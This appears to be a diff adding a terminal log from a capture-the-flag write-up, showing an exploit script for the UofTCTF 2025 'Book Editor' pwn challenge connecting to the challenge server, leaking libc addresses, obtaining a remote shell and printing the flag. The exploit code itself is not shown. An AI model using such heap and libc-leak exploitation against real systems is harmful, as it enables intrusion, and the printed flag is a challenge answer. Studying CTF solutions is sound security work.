@@ -1,0 +1,14 @@
+mito@mito-virtual-machine:~/CTF/UofTCTF_2025/Pwn_Book_Editor$ python3 solve.py r
+[+] Opening connection to 34.46.232.251 on port 5000: Done
+puts_addr = 0x78df03ae4bd0
+libc_base = 0x78df03a5d000
+[*] Switching to interactive mode
+sh: 1: \xad\xfb: not found
+$ id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+$ ls -l
+total 24
+-rwxr-xr-x 1 nobody nogroup 16408 Jan  7 03:30 chall
+-rw-r--r-- 1 nobody nogroup    45 Jan  7 03:31 flag.txt
+$ cat flag.txt
+uoftctf{4lw4y5_ch3ck_f0r_3rr0r5_4f73r_m4ll0c}
